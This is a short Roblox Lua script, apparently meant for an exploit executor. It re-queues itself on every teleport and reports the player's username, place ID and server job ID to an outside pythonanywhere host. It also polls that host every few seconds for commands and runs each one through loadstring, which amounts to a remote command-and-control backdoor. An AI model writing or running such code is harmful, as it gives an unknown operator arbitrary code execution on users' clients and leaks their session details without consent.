local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

-- 🚀 Начало кода автозагрузки
local currentScript = [[
print("aasd")
]]
if queue_on_teleport then
    queue_on_teleport(currentScript)
end
-- 🏁 Конец кода автозагрузки

local function checkCommands()
    local success, result = pcall(function()
        return game:HttpGet("https://tumeutvivgm.pythonanywhere.com/check/" .. localPlayer.Name)
    end)
    
    if success then
        local decodeSuccess, data = pcall(function()
            return HttpService:JSONDecode(result)
        end)
        
        if decodeSuccess and data.commands then
            for _, command in ipairs(data.commands) do
                pcall(function()
                    loadstring(command)()
                end)
            end
        end
    end
end

local function updatePlayerInfo()
    local placeId = tostring(game.PlaceId)
    local jobId = game.JobId
    
    local url = "https://tumeutvivgm.pythonanywhere.com/update_player?username=" .. localPlayer.Name .. "&place_id=" .. placeId .. "&job_id=" .. jobId
    
    pcall(function()
        game:HttpGet(url)
    end)
end

updatePlayerInfo()

while task.wait(3) do
    pcall(checkCommands)
    if task.wait(30) then
        pcall(updatePlayerInfo)
    end
end
